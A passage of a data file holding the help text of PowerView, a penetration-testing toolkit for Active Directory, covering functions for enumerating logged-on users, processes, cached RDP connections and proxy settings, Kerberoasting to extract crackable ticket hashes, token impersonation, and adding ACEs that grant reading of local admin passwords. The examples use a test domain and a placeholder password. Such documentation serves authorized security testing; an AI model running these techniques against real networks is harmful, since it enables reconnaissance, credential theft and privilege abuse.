                'PowerView.FileACL\n'
                '\n'
                'A custom object with the full path and associated ACL '
                'entries.\n'
                '\n'
                '.LINK\n'
                '\n'
                'https://support.microsoft.com/en-us/kb/305144\n',
 'Get-PrincipalContext': '.SYNOPSIS\n'
                         '\n'
                         'Helper to take an Identity and return a '
                         'DirectoryServices.AccountManagement.PrincipalContext\n'
                         'and simplified identity.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: None  \n'
                         '\n'
                         '.PARAMETER Identity\n'
                         '\n'
                         'A group SamAccountName (e.g. Group1), '
                         'DistinguishedName (e.g. '
                         'CN=group1,CN=Users,DC=testlab,DC=local),\n'
                         'SID (e.g. '
                         'S-1-5-21-890171859-3433809279-3366196753-1114), or '
                         'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),\n'
                         'or a DOMAIN\\username identity.\n'
                         '\n'
                         '.PARAMETER Domain\n'
                         '\n'
                         'Specifies the domain to use to search for user/group '
                         'principals, defaults to the current domain.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the target domain.\n',
 'Get-RegLoggedOn': '.SYNOPSIS\n'
                    '\n'
                    'Returns who is logged onto the local (or a remote) '
                    'machine\n'
                    'through enumeration of remote registry keys.\n'
                    '\n'
                    'Note: This function requires only domain user rights on '
                    'the\n'
                    "machine you're enumerating, but remote registry must be "
                    'enabled.\n'
                    '\n'
                    'Author: Matt Kelly (@BreakersAll)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Invoke-UserImpersonation, '
                    'Invoke-RevertToSelf, ConvertFrom-SID  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'This function will query the HKU registry values to '
                    'retrieve the local\n'
                    'logged on users SID and then attempt and reverse it.\n'
                    "Adapted technique from Sysinternal's PSLoggedOn script. "
                    'Benefit over\n'
                    'using the NetWkstaUserEnum API (Get-NetLoggedon) of less '
                    'user privileges\n'
                    'required (NetWkstaUserEnum requires remote admin '
                    'access).\n'
                    '\n'
                    '.PARAMETER ComputerName\n'
                    '\n'
                    'Specifies the hostname to query for remote registry '
                    'values (also accepts IP addresses).\n'
                    "Defaults to 'localhost'.\n"
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the remote system using '
                    'Invoke-UserImpersonation.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-RegLoggedOn\n'
                    '\n'
                    'Returns users actively logged onto the local host.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-RegLoggedOn -ComputerName sqlserver\n'
                    '\n'
                    "Returns users actively logged onto the 'sqlserver' host.\n"
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainController | Get-RegLoggedOn\n'
                    '\n'
                    'Returns users actively logged on all domain controllers.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'Get-RegLoggedOn -ComputerName sqlserver -Credential '
                    '$Cred\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.RegLoggedOnUser\n'
                    '\n'
                    'A PSCustomObject including the '
                    'UserDomain/UserName/UserSID of each\n'
                    'actively logged on user, with the ComputerName added.\n',
 'Get-WMIProcess': '.SYNOPSIS\n'
                   '\n'
                   'Returns a list of processes and their owners on the local '
                   'or remote machine.\n'
                   '\n'
                   'Author: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: None  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'Uses Get-WMIObject to enumerate all Win32_process '
                   'instances on the local or remote machine,\n'
                   'including the owners of the particular process.\n'
                   '\n'
                   '.PARAMETER ComputerName\n'
                   '\n'
                   'Specifies the hostname to query for cached RDP connections '
                   '(also accepts IP addresses).\n'
                   "Defaults to 'localhost'.\n"
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the remote system.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-WMIProcess -ComputerName WINDOWS1\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   'Get-WMIProcess -ComputerName PRIMARY.testlab.local '
                   '-Credential $Cred\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'PowerView.UserProcess\n'
                   '\n'
                   'A PSCustomObject containing the remote process '
                   'information.\n',
 'Get-WMIRegCachedRDPConnection': '.SYNOPSIS\n'
                                  '\n'
                                  'Returns information about RDP connections '
                                  'outgoing from the local (or remote) '
                                  'machine.\n'
                                  '\n'
                                  'Note: This function requires administrative '
                                  "rights on the machine you're enumerating.\n"
                                  '\n'
                                  'Author: Will Schroeder (@harmj0y)  \n'
                                  'License: BSD 3-Clause  \n'
                                  'Required Dependencies: ConvertFrom-SID  \n'
                                  '\n'
                                  '.DESCRIPTION\n'
                                  '\n'
                                  'Uses remote registry functionality to query '
                                  'all entries for the\n'
                                  '"Windows Remote Desktop Connection Client" '
                                  'on a machine, separated by\n'
                                  'user and target server.\n'
                                  '\n'
                                  '.PARAMETER ComputerName\n'
                                  '\n'
                                  'Specifies the hostname to query for cached '
                                  'RDP connections (also accepts IP '
                                  'addresses).\n'
                                  "Defaults to 'localhost'.\n"
                                  '\n'
                                  '.PARAMETER Credential\n'
                                  '\n'
                                  'A [Management.Automation.PSCredential] '
                                  'object of alternate credentials\n'
                                  'for connecting to the remote system.\n'
                                  '\n'
                                  '.EXAMPLE\n'
                                  '\n'
                                  'Get-WMIRegCachedRDPConnection\n'
                                  '\n'
                                  'Returns the RDP connection client '
                                  'information for the local machine.\n'
                                  '\n'
                                  '.EXAMPLE\n'
                                  '\n'
                                  'Get-WMIRegCachedRDPConnection  '
                                  '-ComputerName WINDOWS2.testlab.local\n'
                                  '\n'
                                  'Returns the RDP connection client '
                                  'information for the WINDOWS2.testlab.local '
                                  'machine\n'
                                  '\n'
                                  '.EXAMPLE\n'
                                  '\n'
                                  'Get-DomainComputer | '
                                  'Get-WMIRegCachedRDPConnection\n'
                                  '\n'
                                  'Returns cached RDP information for all '
                                  'machines in the domain.\n'
                                  '\n'
                                  '.EXAMPLE\n'
                                  '\n'
                                  '$SecPassword = ConvertTo-SecureString '
                                  "'Password123!' -AsPlainText -Force\n"
                                  '$Cred = New-Object '
                                  "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                                  '$SecPassword)\n'
                                  'Get-WMIRegCachedRDPConnection -ComputerName '
                                  'PRIMARY.testlab.local -Credential $Cred\n'
                                  '\n'
                                  '.OUTPUTS\n'
                                  '\n'
                                  'PowerView.CachedRDPConnection\n'
                                  '\n'
                                  'A PSCustomObject containing the '
                                  'ComputerName and cached RDP information.\n',
 'Get-WMIRegLastLoggedOn': '.SYNOPSIS\n'
                           '\n'
                           'Returns the last user who logged onto the local '
                           '(or a remote) machine.\n'
                           '\n'
                           'Note: This function requires administrative rights '
                           "on the machine you're enumerating.\n"
                           '\n'
                           'Author: Will Schroeder (@harmj0y)  \n'
                           'License: BSD 3-Clause  \n'
                           'Required Dependencies: None  \n'
                           '\n'
                           '.DESCRIPTION\n'
                           '\n'
                           'This function uses remote registry to enumerate '
                           'the LastLoggedOnUser registry key\n'
                           'for the local (or remote) machine.\n'
                           '\n'
                           '.PARAMETER ComputerName\n'
                           '\n'
                           'Specifies the hostname to query for remote '
                           'registry values (also accepts IP addresses).\n'
                           "Defaults to 'localhost'.\n"
                           '\n'
                           '.PARAMETER Credential\n'
                           '\n'
                           'A [Management.Automation.PSCredential] object of '
                           'alternate credentials\n'
                           'for connecting to the remote system.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-WMIRegLastLoggedOn\n'
                           '\n'
                           'Returns the last user logged onto the local '
                           'machine.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-WMIRegLastLoggedOn -ComputerName WINDOWS1\n'
                           '\n'
                           'Returns the last user logged onto WINDOWS1\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-DomainComputer | Get-WMIRegLastLoggedOn\n'
                           '\n'
                           'Returns the last user logged onto all machines in '
                           'the domain.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$SecPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           '$Cred = New-Object '
                           "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                           '$SecPassword)\n'
                           'Get-WMIRegLastLoggedOn -ComputerName '
                           'PRIMARY.testlab.local -Credential $Cred\n'
                           '\n'
                           '.OUTPUTS\n'
                           '\n'
                           'PowerView.LastLoggedOnUser\n'
                           '\n'
                           'A PSCustomObject containing the ComputerName and '
                           'last loggedon user.\n',
 'Get-WMIRegMountedDrive': '.SYNOPSIS\n'
                           '\n'
                           'Returns information about saved network mounted '
                           'drives for the local (or remote) machine.\n'
                           '\n'
                           'Note: This function requires administrative rights '
                           "on the machine you're enumerating.\n"
                           '\n'
                           'Author: Will Schroeder (@harmj0y)  \n'
                           'License: BSD 3-Clause  \n'
                           'Required Dependencies: ConvertFrom-SID  \n'
                           '\n'
                           '.DESCRIPTION\n'
                           '\n'
                           'Uses remote registry functionality to enumerate '
                           'recently mounted network drives.\n'
                           '\n'
                           '.PARAMETER ComputerName\n'
                           '\n'
                           'Specifies the hostname to query for mounted drive '
                           'information (also accepts IP addresses).\n'
                           "Defaults to 'localhost'.\n"
                           '\n'
                           '.PARAMETER Credential\n'
                           '\n'
                           'A [Management.Automation.PSCredential] object of '
                           'alternate credentials\n'
                           'for connecting to the remote system.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-WMIRegMountedDrive\n'
                           '\n'
                           'Returns the saved network mounted drives for the '
                           'local machine.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-WMIRegMountedDrive -ComputerName '
                           'WINDOWS2.testlab.local\n'
                           '\n'
                           'Returns the saved network mounted drives for the '
                           'WINDOWS2.testlab.local machine\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           'Get-DomainComputer | Get-WMIRegMountedDrive\n'
                           '\n'
                           'Returns the saved network mounted drives for all '
                           'machines in the domain.\n'
                           '\n'
                           '.EXAMPLE\n'
                           '\n'
                           '$SecPassword = ConvertTo-SecureString '
                           "'Password123!' -AsPlainText -Force\n"
                           '$Cred = New-Object '
                           "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                           '$SecPassword)\n'
                           'Get-WMIRegMountedDrive -ComputerName '
                           'PRIMARY.testlab.local -Credential $Cred\n'
                           '\n'
                           '.OUTPUTS\n'
                           '\n'
                           'PowerView.RegMountedDrive\n'
                           '\n'
                           'A PSCustomObject containing the ComputerName and '
                           'mounted drive information.\n',
 'Get-WMIRegProxy': '.SYNOPSIS\n'
                    '\n'
                    'Enumerates the proxy server and WPAD conents for the '
                    'current user.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: None  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'Enumerates the proxy server and WPAD specification for '
                    'the current user\n'
                    'on the local machine (default), or a machine specified '
                    'with -ComputerName.\n'
                    'It does this by enumerating settings from\n'
                    'HKU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet '
                    'Settings.\n'
                    '\n'
                    '.PARAMETER ComputerName\n'
                    '\n'
                    'Specifies the system to enumerate proxy settings on. '
                    'Defaults to the local host.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connecting to the remote system.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-WMIRegProxy\n'
                    '\n'
                    'ComputerName           ProxyServer            '
                    'AutoConfigURL         Wpad\n'
                    '------------           -----------            '
                    '-------------         ----\n'
                    'WINDOWS1               http://primary.test...\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    '$Cred = Get-Credential "TESTLAB\\administrator"\n'
                    'Get-WMIRegProxy -Credential $Cred -ComputerName '
                    'primary.testlab.local\n'
                    '\n'
                    'ComputerName            ProxyServer            '
                    'AutoConfigURL         Wpad\n'
                    '------------            -----------            '
                    '-------------         ----\n'
                    'windows1.testlab.local  primary.testlab.local\n'
                    '\n'
                    '.INPUTS\n'
                    '\n'
                    'String\n'
                    '\n'
                    'Accepts one or more computer name specification strings  '
                    'on the pipeline (netbios or FQDN).\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.ProxySettings\n'
                    '\n'
                    'Outputs custom PSObjects with the ComputerName, '
                    'ProxyServer, AutoConfigURL, and WPAD contents.\n',
 'Invoke-Kerberoast': '.SYNOPSIS\n'
                      '\n'
                      'Requests service tickets for kerberoast-able accounts '
                      'and returns extracted ticket hashes.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y), @machosec  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: Invoke-UserImpersonation, '
                      'Invoke-RevertToSelf, Get-DomainUser, '
                      'Get-DomainSPNTicket  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'Uses Get-DomainUser to query for user accounts with '
                      'non-null service principle\n'
                      'names (SPNs) and uses Get-SPNTicket to request/extract '
                      'the crackable ticket information.\n'
                      'The ticket format can be specified with -OutputFormat '
                      '<John/Hashcat>.\n'
                      '\n'
                      '.PARAMETER Identity\n'
                      '\n'
                      'A SamAccountName (e.g. harmj0y), DistinguishedName '
                      '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                      'SID (e.g. '
                      'S-1-5-21-890171859-3433809279-3366196753-1108), or GUID '
                      '(e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                      'Wildcards accepted.\n'
                      '\n'
                      '.PARAMETER Domain\n'
                      '\n'
                      'Specifies the domain to use for the query, defaults to '
                      'the current domain.\n'
                      '\n'
                      '.PARAMETER LDAPFilter\n'
                      '\n'
                      'Specifies an LDAP query string that is used to filter '
                      'Active Directory objects.\n'
                      '\n'
                      '.PARAMETER SearchBase\n'
                      '\n'
                      'The LDAP source to search through, e.g. '
                      '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                      'Useful for OU queries.\n'
                      '\n'
                      '.PARAMETER Server\n'
                      '\n'
                      'Specifies an Active Directory server (domain '
                      'controller) to bind to.\n'
                      '\n'
                      '.PARAMETER SearchScope\n'
                      '\n'
                      'Specifies the scope to search under, '
                      'Base/OneLevel/Subtree (default of Subtree).\n'
                      '\n'
                      '.PARAMETER ResultPageSize\n'
                      '\n'
                      'Specifies the PageSize to set for the LDAP searcher '
                      'object.\n'
                      '\n'
                      '.PARAMETER ServerTimeLimit\n'
                      '\n'
                      'Specifies the maximum amount of time the server spends '
                      'searching. Default of 120 seconds.\n'
                      '\n'
                      '.PARAMETER Tombstone\n'
                      '\n'
                      'Switch. Specifies that the searcher should also return '
                      'deleted/tombstoned objects.\n'
                      '\n'
                      '.PARAMETER OutputFormat\n'
                      '\n'
                      "Either 'John' for John the Ripper style hash "
                      "formatting, or 'Hashcat' for Hashcat format.\n"
                      "Defaults to 'Hashcat'.\n"
                      '\n'
                      '.PARAMETER Credential\n'
                      '\n'
                      'A [Management.Automation.PSCredential] object of '
                      'alternate credentials\n'
                      'for connection to the target domain.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Invoke-Kerberoast | fl\n'
                      '\n'
                      'Kerberoasts all found SPNs for the current domain, '
                      'outputting to Hashcat format (default).\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Invoke-Kerberoast -Domain dev.testlab.local | fl\n'
                      '\n'
                      'Kerberoasts all found SPNs for the testlab.local '
                      'domain, outputting to JTR\n'
                      'format instead of Hashcat.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      "$SecPassword = ConvertTo-SecureString 'Password123!' "
                      '-AsPlainText -orce\n'
                      '$Cred = New-Object '
                      "System.Management.Automation.PSCredential('TESTLB\\dfm.a', "
                      '$SecPassword)\n'
                      'Invoke-Kerberoast -Credential $Cred -Verbose -Domain '
                      'testlab.local | fl\n'
                      '\n'
                      'Kerberoasts all found SPNs for the testlab.local domain '
                      'using alternate credentials.\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'PowerView.SPNTicket\n'
                      '\n'
                      'Outputs a custom object containing the SamAccountName, '
                      'ServicePrincipalName, and encrypted ticket section.\n',
 'Invoke-RevertToSelf': '.SYNOPSIS\n'
                        '\n'
                        'Reverts any token impersonation.\n'
                        '\n'
                        'Author: Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: PSReflect  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'This function uses RevertToSelf() to revert any '
                        'impersonated tokens.\n'
                        'If -TokenHandle is passed (the token handle returned '
                        'by Invoke-UserImpersonation),\n'
                        'CloseHandle() is used to close the opened handle.\n'
                        '\n'
                        '.PARAMETER TokenHandle\n'
                        '\n'
                        'An optional IntPtr TokenHandle returned by '
                        'Invoke-UserImpersonation.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        "$SecPassword = ConvertTo-SecureString 'Password123!' "
                        '-AsPlainText -Force\n'
                        '$Cred = New-Object '
                        "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                        '$SecPassword)\n'
                        '$Token = Invoke-UserImpersonation -Credential $Cred\n'
                        'Invoke-RevertToSelf -TokenHandle $Token\n',
 'Invoke-UserImpersonation': '.SYNOPSIS\n'
                             '\n'
                             'Creates a new "runas /netonly" type logon and '
                             'impersonates the token.\n'
                             '\n'
                             'Author: Will Schroeder (@harmj0y)  \n'
                             'License: BSD 3-Clause  \n'
                             'Required Dependencies: PSReflect  \n'
                             '\n'
                             '.DESCRIPTION\n'
                             '\n'
                             'This function uses LogonUser() with the '
                             'LOGON32_LOGON_NEW_CREDENTIALS LogonType\n'
                             'to simulate "runas /netonly". The resulting '
                             'token is then impersonated with\n'
                             'ImpersonateLoggedOnUser() and the token handle '
                             'is returned for later usage\n'
                             'with Invoke-RevertToSelf.\n'
                             '\n'
                             '.PARAMETER Credential\n'
                             '\n'
                             'A [Management.Automation.PSCredential] object '
                             'with alternate credentials\n'
                             'to impersonate in the current thread space.\n'
                             '\n'
                             '.PARAMETER TokenHandle\n'
                             '\n'
                             'An IntPtr TokenHandle returned by a previous '
                             'Invoke-UserImpersonation.\n'
                             'If this is supplied, LogonUser() is skipped and '
                             'only ImpersonateLoggedOnUser()\n'
                             'is executed.\n'
                             '\n'
                             '.PARAMETER Quiet\n'
                             '\n'
                             'Suppress any warnings about STA vs MTA.\n'
                             '\n'
                             '.EXAMPLE\n'
                             '\n'
                             '$SecPassword = ConvertTo-SecureString '
                             "'Password123!' -AsPlainText -Force\n"
                             '$Cred = New-Object '
                             "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                             '$SecPassword)\n'
                             'Invoke-UserImpersonation -Credential $Cred\n'
                             '\n'
                             '.OUTPUTS\n'
                             '\n'
                             'IntPtr\n'
                             '\n'
                             'The TokenHandle result from LogonUser.\n',
 'New-ADObjectAccessControlEntry': '.SYNOPSIS\n'
                                   '\n'
                                   'Creates a new Active Directory '
                                   'object-specific access control entry.\n'
                                   '\n'
                                   'Author: Lee Christensen (@tifkin_)  \n'
                                   'License: BSD 3-Clause  \n'
                                   'Required Dependencies: None\n'
                                   '\n'
                                   '.DESCRIPTION\n'
                                   '\n'
                                   'Creates a new object-specific access '
                                   'control entry (ACE).  The ACE could be \n'
                                   'used for auditing access to an object or '
                                   'controlling access to objects.\n'
                                   '\n'
                                   '.PARAMETER PrincipalIdentity\n'
                                   '\n'
                                   'A SamAccountName (e.g. harmj0y), '
                                   'DistinguishedName (e.g. '
                                   'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                                   'SID (e.g. '
                                   'S-1-5-21-890171859-3433809279-3366196753-1108), '
                                   'or GUID (e.g. '
                                   '4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                                   'for the domain principal to add for the '
                                   'ACL. Required. Wildcards accepted.\n'
                                   '\n'
                                   '.PARAMETER PrincipalDomain\n'
                                   '\n'
                                   'Specifies the domain for the '
                                   'TargetIdentity to use for the principal, '
                                   'defaults to the current domain.\n'
                                   '\n'
                                   '.PARAMETER PrincipalSearchBase\n'
                                   '\n'
                                   'The LDAP source to search through for '
                                   'principals, e.g. '
                                   '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                   'Useful for OU queries.\n'
                                   '\n'
                                   '.PARAMETER Server\n'
                                   '\n'
                                   'Specifies an Active Directory server '
                                   '(domain controller) to bind to.\n'
                                   '\n'
                                   '.PARAMETER SearchScope\n'
                                   '\n'
                                   'Specifies the scope to search under, '
                                   'Base/OneLevel/Subtree (default of '
                                   'Subtree).\n'
                                   '\n'
                                   '.PARAMETER ResultPageSize\n'
                                   '\n'
                                   'Specifies the PageSize to set for the LDAP '
                                   'searcher object.\n'
                                   '\n'
                                   '.PARAMETER ServerTimeLimit\n'
                                   '\n'
                                   'Specifies the maximum amount of time the '
                                   'server spends searching. Default of 120 '
                                   'seconds.\n'
                                   '\n'
                                   '.PARAMETER Tombstone\n'
                                   '\n'
                                   'Switch. Specifies that the searcher should '
                                   'also return deleted/tombstoned objects.\n'
                                   '\n'
                                   '.PARAMETER Credential\n'
                                   '\n'
                                   'A [Management.Automation.PSCredential] '
                                   'object of alternate credentials\n'
                                   'for connection to the target domain.\n'
                                   '\n'
                                   '.PARAMETER Right\n'
                                   '\n'
                                   'Specifies the rights set on the Active '
                                   'Directory object.\n'
                                   '\n'
                                   '.PARAMETER AccessControlType\n'
                                   '\n'
                                   'Specifies the type of ACE (allow or deny)\n'
                                   '\n'
                                   '.PARAMETER AuditFlag\n'
                                   '\n'
                                   'For audit ACEs, specifies when to create '
                                   'an audit log (on success or failure)\n'
                                   '\n'
                                   '.PARAMETER ObjectType\n'
                                   '\n'
                                   'Specifies the GUID of the object that the '
                                   'ACE applies to.\n'
                                   '\n'
                                   '.PARAMETER InheritanceType\n'
                                   '\n'
                                   'Specifies how the ACE applies to the '
                                   'object and/or its children.\n'
                                   '\n'
                                   '.PARAMETER InheritedObjectType\n'
                                   '\n'
                                   'Specifies the type of object that can '
                                   'inherit the ACE.\n'
                                   '\n'
                                   '.EXAMPLE\n'
                                   '\n'
                                   '$Guids = Get-DomainGUIDMap\n'
                                   '$AdmPropertyGuid = $Guids.GetEnumerator() '
                                   "| ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select "
                                   '-ExpandProperty name\n'
                                   '$CompPropertyGuid = $Guids.GetEnumerator() '
                                   "| ?{$_.value -eq 'Computer'} | select "
                                   '-ExpandProperty name\n'
                                   '$ACE = New-ADObjectAccessControlEntry '
                                   '-Verbose -PrincipalIdentity itadmin -Right '
                                   'ExtendedRight,ReadProperty '
                                   '-AccessControlType Allow -ObjectType '
                                   '$AdmPropertyGuid -InheritanceType All '
                                   '-InheritedObjectType $CompPropertyGuid\n'
                                   '$OU = Get-DomainOU -Raw Workstations\n'
                                   '$DsEntry = $OU.GetDirectoryEntry()\n'
                                   '$dsEntry.PsBase.Options.SecurityMasks = '
                                   "'Dacl'\n"
                                   '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n'
                                   '$dsEntry.PsBase.CommitChanges()\n'
                                   '\n'
                                   'Adds an ACE to all computer objects in the '
                                   'OU "Workstations" permitting the\n'
                                   'user "itadmin" to read the confidential '
                                   'ms-Mcs-AdmPwd computer property.\n'
                                   '\n'
                                   '.OUTPUTS\n'
                                   '\n'
                                   'System.Security.AccessControl.AuthorizationRule\n',
 'New-DomainGroup': '.SYNOPSIS\n'
                    '\n'
                    'Creates a new domain group (assuming appropriate '
                    'permissions) and returns the group object.\n'
                    '\n'
                    'TODO: implement all properties that New-ADGroup '
                    'implements '
                    '(https://technet.microsoft.com/en-us/library/ee617253.aspx).\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Get-PrincipalContext  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'First binds to the specified domain context using '
                    'Get-PrincipalContext.\n'
                    'The bound domain context is then used to create a new\n'
                    'DirectoryServices.AccountManagement.GroupPrincipal with '
                    'the specified\n'
                    'group properties.\n'
                    '\n'
                    '.PARAMETER SamAccountName\n'
                    '\n'
                    'Specifies the Security Account Manager (SAM) account name '
                    'of the group to create.\n'
                    'Maximum of 256 characters. Mandatory.\n'
                    '\n'
                    '.PARAMETER Name\n'
                    '\n'
                    'Specifies the name of the group to create. If not '
                    'provided, defaults to SamAccountName.\n'
                    '\n'
                    '.PARAMETER DisplayName\n'
                    '\n'
                    'Specifies the display name of the group to create. If not '
                    'provided, defaults to SamAccountName.\n'
                    '\n'
                    '.PARAMETER Description\n'
                    '\n'
                    'Specifies the description of the group to create.\n'
                    '\n'
                    '.PARAMETER Domain\n'
                    '\n'
                    'Specifies the domain to use to search for user/group '
                    'principals, defaults to the current domain.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the target domain.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'New-DomainGroup -SamAccountName TestGroup -Description '
                    "'This is a test group.'\n"
                    '\n'
                    "Creates the 'TestGroup' group with the specified "
                    'description.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'New-DomainGroup -SamAccountName TestGroup -Description '
                    "'This is a test group.' -Credential $Cred\n"
                    '\n'
                    "Creates the 'TestGroup' group with the specified "
                    'description using the specified alternate credentials.\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'DirectoryServices.AccountManagement.GroupPrincipal\n',
 'New-DomainUser': '.SYNOPSIS\n'
                   '\n'
                   'Creates a new domain user (assuming appropriate '
                   'permissions) and returns the user object.\n'
                   '\n'
                   'TODO: implement all properties that New-ADUser implements '
                   '(https://technet.microsoft.com/en-us/library/ee617253.aspx).\n'
                   '\n'
                   'Author: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: Get-PrincipalContext  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'First binds to the specified domain context using '
                   'Get-PrincipalContext.\n'
                   'The bound domain context is then used to create a new\n'
                   'DirectoryServices.AccountManagement.UserPrincipal with the '
                   'specified user properties.\n'
                   '\n'
                   '.PARAMETER SamAccountName\n'
                   '\n'
                   'Specifies the Security Account Manager (SAM) account name '
                   'of the user to create.\n'
                   'Maximum of 256 characters. Mandatory.\n'
                   '\n'
                   '.PARAMETER AccountPassword\n'
                   '\n'
                   'Specifies the password for the created user. Mandatory.\n'
                   '\n'
                   '.PARAMETER Name\n'
                   '\n'
                   'Specifies the name of the user to create. If not provided, '
                   'defaults to SamAccountName.\n'
                   '\n'
                   '.PARAMETER DisplayName\n'
                   '\n'
                   'Specifies the display name of the user to create. If not '
                   'provided, defaults to SamAccountName.\n'
                   '\n'
                   '.PARAMETER Description\n'
                   '\n'
                   'Specifies the description of the user to create.\n'
                   '\n'
                   '.PARAMETER Domain\n'
                   '\n'
                   'Specifies the domain to use to search for user/group '
                   'principals, defaults to the current domain.\n'
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the target domain.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$UserPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   "New-DomainUser -SamAccountName harmj0y2 -Description 'This "
                   "is harmj0y' -AccountPassword $UserPassword\n"
                   '\n'
                   "Creates the 'harmj0y2' user with the specified description "
                   'and password.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                   '$SecPassword)\n'
                   "$UserPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$user = New-DomainUser -SamAccountName harmj0y2 '
                   "-Description 'This is harmj0y' -AccountPassword "
                   '$UserPassword -Credential $Cred\n'
                   '\n'
                   "Creates the 'harmj0y2' user with the specified description "
                   'and password, using the specified\n'
                   'alternate credentials.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
